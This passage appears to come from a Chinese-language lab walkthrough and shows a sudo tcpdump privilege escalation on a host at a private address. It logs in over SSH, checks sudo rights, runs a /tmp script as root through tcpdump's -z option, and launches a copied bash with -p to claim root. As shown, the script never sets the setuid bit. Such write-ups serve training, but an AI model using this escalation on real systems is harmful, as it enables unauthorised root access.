### **2.2 主机渗透测试**

#### **1.使用账号密码进行SSH连接**

```
ssh webdeveloper@192.168.207.150
```

![](../Images/0d1a2c2cbe9b5f723fdb7f1f4194b154.png)

#### **2.查看用户sudo权限**

```
sudo -l
```

![](../Images/560ce9f6793866443514f0e4581d3177.png)

#### **3.使用tcpdump提权**

在/tmp目录中创建文件

```
vim /tmp/bash
```

```

cp /bin/bash /tmp/sh-1
```

![](../Images/161f6a428a784684489bfe0e6367d377.png)

赋予文件执行权限

```
chmod +x /tmp/bash
```

#### **4.开启tcpdump服务**

```
sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/bash -Z root
```

![](../Images/b0e3bb4983071b678b44af36ce45fa58.png)

#### **5.重新开启SSH连接**

新开终端使用nc连接本地网卡，发送数据包

```
nc -v -z -n -w 1 127.0.0.1 1
```

![](../Images/5b06ed62967b57ff119cd9ebeaf0b3b5.png)

![](../Images/6b4a0dc084e0773cbd195a044fa5b8b7.png)

#### **6.配置升级shell权限**

```
ls -lh /tmp/sh-1
```

![](../Images/b4cd91cb9fe515b7ce6cfff95ac9f37e.png)

#### **7.提升权限**

```
/tmp/sh-1 -p
```

已经获取到root权限
